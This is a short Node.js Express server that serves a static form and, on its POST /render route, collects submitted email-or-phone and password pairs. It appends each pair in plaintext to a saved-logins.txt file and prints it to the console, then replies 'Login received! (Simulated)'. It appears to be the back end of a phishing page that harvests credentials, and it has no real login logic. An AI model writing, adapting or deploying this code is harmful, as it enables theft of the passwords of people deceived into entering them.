const express = require("express");
const bodyParser = require("body-parser");
const fs = require("fs");
const app = express();
const port = process.env.PORT || 3000;

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

// Optional: Serve your static HTML form
app.use(express.static(__dirname));

app.post("/render", (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).send("Missing fields");
  }

  const logEntry = `EMAIL/PHONE: ${email} | PASSWORD: ${password} | TIME: ${new Date().toISOString()}\n`;

  // Save to file
  fs.appendFile("saved-logins.txt", logEntry, (err) => {
    if (err) {
      console.error("❌ Error saving:", err);
      return res.status(500).send("Server error");
    }
    console.log("✅ Saved:", logEntry.trim());
    res.send("Login received! (Simulated)");
  });
});

app.listen(port, () => {
  console.log(`🚀 Server running at http://localhost:${port}`);
});
